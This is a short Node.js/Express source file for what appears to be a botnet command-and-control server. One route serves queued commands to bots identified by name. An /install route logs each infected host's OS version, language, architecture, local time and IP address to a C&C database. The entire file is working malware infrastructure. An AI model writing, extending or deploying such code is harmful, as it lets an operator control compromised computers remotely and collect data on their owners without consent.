var express = require('express');
var path = require('path');
var router = express.Router();

var cncDb = require('../cncdb');

router.get('/', function(req, res) {
  var botname = req.query.name;
  cncDb.getNextCommand(botname, function(command) {
    res.send("cmd:" + command + ":end");
  });
});

router.post('/install', function(req, res) {
  var data = req.body;

  if ( !data.name || !data.group || !data.version || !data.osversion || !data.language || !data.bits ||
    !data.localtime )
  {
    console.log("Got a bad install");
    res.send('bad');
  }

  // first install, record some details about this user
  cncDb.install(data.name, data.group, data.version, data.osversion, data.language,
                                    data.bits, data.localtime, req.connection.remoteAddress, function(){
    res.send('ok');
  });
});

module.exports = router;
